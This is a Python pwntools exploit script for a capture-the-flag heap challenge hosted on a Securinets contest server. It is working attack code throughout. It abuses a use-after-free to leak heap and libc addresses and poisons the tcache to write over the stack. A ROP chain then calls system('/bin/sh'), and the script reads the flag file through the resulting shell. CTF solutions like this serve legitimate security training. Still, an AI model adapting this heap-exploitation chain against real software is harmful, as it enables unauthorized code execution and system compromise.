#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 9091
HOST = "pwn-14caf623.p1.securinets.tn"
exe = context.binary = ELF('./main_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000001376
            brva 0x0000000000001A2B

            # edit
            brva 0x0000000000001693

            # show
            brva 0x0000000000001895

            # feedback
            brva 0x00000000000018C8
            brva 0x0000000000001ADA
            brva 0x0000000000001BDD

            brva 0x0000000000001CF8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, name, effect, cost, cool, choice):
	p.sendlineafter(b'Choice: ', str(1))
	p.sendlineafter(b'(0-31): ', str(idx))
	p.sendafter(b'name: ', name)
	p.sendafter(b'effect: ', effect)
	p.sendlineafter(b'cost: ', str(cost))
	p.sendlineafter(b'seconds): ', str(cool))
	p.sendlineafter(b'Choice: ', str(choice))

def edit(idx, name, effect, cost, cool, choice):
	p.sendlineafter(b'Choice: ', str(2))
	p.sendlineafter(b'(0-31): ', str(idx))
	p.sendafter(b'name: ', name)
	p.sendafter(b'effect: ', effect)
	p.sendlineafter(b'cost: ', str(cost))
	p.sendlineafter(b'seconds): ', str(cool))
	p.sendlineafter(b'Choice: ', str(choice))

def show():
	p.sendlineafter(b'Choice: ', str(3))

def free(idx):
	p.sendlineafter(b'Choice: ', str(4))
	p.sendlineafter(b'(0-31): ', str(idx))

def feedback(size, data):
	p.sendlineafter(b'Choice: ', str(5))
	p.sendlineafter(b'feedback: ', str(size))
	p.sendlineafter(b'feedback: ', data)

# VARIABLE


# PAYLOAD
for i in range(17):
	add(i, b'nhh', b'effect', 1, 2, 3)
free(0)
show()
p.recvuntil(b'Slot 0:\n')
p.recvuntil(b'Name: ')
heap_leak = u64(p.recv(5) + b'\0'*3)
heap_base = heap_leak << 12
log.info("Heap base: " + hex(heap_base))

for i in range(1, 7):
	free(i)
free(8)
free(7)
target = (heap_base + 0x630) ^ ((heap_base + 0x620) >> 12)
edit(7, p64(target) + p64(0)*2 + p64(0x81), b'b', 1, 2, 3)
add(10, p64(0)*3 + p64(0x81), b'b', 1, 2, 3)
add(11, b'nhh', b'effect', 1, 2, 3)
edit(10, p64(0)*3 + p64(0x461), b'b', 1, 2, 3)
free(11)
show()
p.recvuntil(b'Slot 7:\n')
p.recvuntil(b'Effect: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x203b20
log.info("Libc base: " + hex(libc.address))
environ = libc.sym.environ
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))
pop_rdi = 0x000000000010f78b + libc.address
ret = pop_rdi + 1

free(13)
free(12)
edit(13, p64(heap_leak), b'b', 1, 2, 3)
add(12, b'a', b'b', 1, 2, 3)
add(13, b'a', b'b', 1, 2, 3) # no more fastbin
target = (environ - 0x18) ^ ((heap_base + 0x5a0) >> 12)
edit(6, p64(target), b'b', 1, 2, 3)
feedback(0x78, b'a')
feedback(0x78, b'a'*0x17)
p.recvuntil(b'\n')
stack_leak = u64(p.recv(6) + b'\0'*2)
log.info("Stack leak: " + hex(stack_leak))

free(15)
free(14)
free(13)
free(12)
target = stack_leak - 0x178 + 0x30 ^ ((heap_base + 0x890) >> 12)
edit(12, p64(target), b'b', 1, 2, 3)
add(12, b'a', b'b', 1, 2, 3)
payload = flat(
	b'a'*8,
	pop_rdi,
	bin_sh,
	ret,
	system,
	)
add(13, payload, b'b', 1, 2, 3)

p.sendafter(b'name: ', b'a')
p.sendafter(b'effect: ', b'b')
p.sendlineafter(b'cost: ', str(1))
p.sendlineafter(b'seconds): ', str(2))
p.sendlineafter(b'Choice: ', str(3))
p.sendlineafter(b'Choice: ', str(6))
p.sendline(b'cat /home/ctf/flag.txt')

p.interactive()